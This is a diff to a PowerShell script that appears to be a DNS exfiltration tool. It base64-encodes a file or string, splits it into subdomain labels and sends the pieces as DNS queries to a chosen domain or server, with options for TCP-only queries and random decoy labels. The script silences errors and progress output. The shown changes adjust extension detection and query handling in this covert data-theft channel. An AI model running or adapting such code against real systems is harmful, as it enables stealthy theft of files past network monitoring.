@@ -4,9 +4,11 @@
 #================================#
 
 # Design
-$ErrorActionPreference = "SilentlyContinue"
 $Host.UI.RawUI.BackgroundColor = 'Black'
 $Host.UI.RawUI.ForegroundColor = 'White'
+$ProgressPreference = 'SilentlyContinue'
+$ErrorActionPreference = "SilentlyContinue"
+Set-StrictMode -Off
 
 # Parameters
 $Target=$args[1]
@@ -66,8 +68,9 @@ filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim(".") } ; $SubdomainLen
 
 # Data Input 
 if (($Payload -like "*:\*") -or ($Payload -like ".\*")) { $b64Payload = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Payload)) }
-else { $b64Payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Payload)) } ; $Payload = $b64Payload
-if ("." -in $Payload.Split) { $Extension = $Payload.Split(".")[-1] } else { $Extension = "txt" }
+else { $b64Payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Payload)) }
+if ($Payload.Split(".")[1]) { $Extension = $Payload.Split(".")[-1] } else { $Extension = "txt" }
+$Payload = $b64Payload
 
 # Display Info
 function Show-Info {
@@ -107,9 +110,9 @@ $RandTarget2 = (-join (( 0x66..0x7A) | Get-Random -Count $(Get-Random (4..5))  |
 $RandTarget3 = (-join (( 0x66..0x7A) | Get-Random -Count $(Get-Random (2..3))  | % {[char]$_})) ; if ($Random) {
 
 if (!$Server) { if ($TcpOnly -in 'True') { $DnsQuery = Resolve-DnsName -TcpOnly -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
-else { $DnsQuery = Resolve-DnsName -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}
+else { $DnsQuery = Resolve-DnsName -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" ; $DnsQuery | Select -First 1 }}
 else { if ($TcpOnly -in 'True') { $DnsQuery = Resolve-DnsName -TcpOnly -Server $Server -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
-else { $DnsQuery = Resolve-DnsName -Server $Server -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}}
+else { $DnsQuery = Resolve-DnsName -Server $Server -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" ; $DnsQuery | Select -First 1 }}}
 
 else { if (!$Server) { if ($TcpOnly -in 'True') { $DnsQuery = Resolve-DnsName -TcpOnly -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$($Target|Get-Random)" ; $DnsQuery | Select -First 1 }
 else { $DnsQuery = Resolve-DnsName -type A -DnsOnly -QuickTimeout "$((++$global:base)).$domain.$($Target|Get-Random)" ; $DnsQuery | Select -First 1 }}
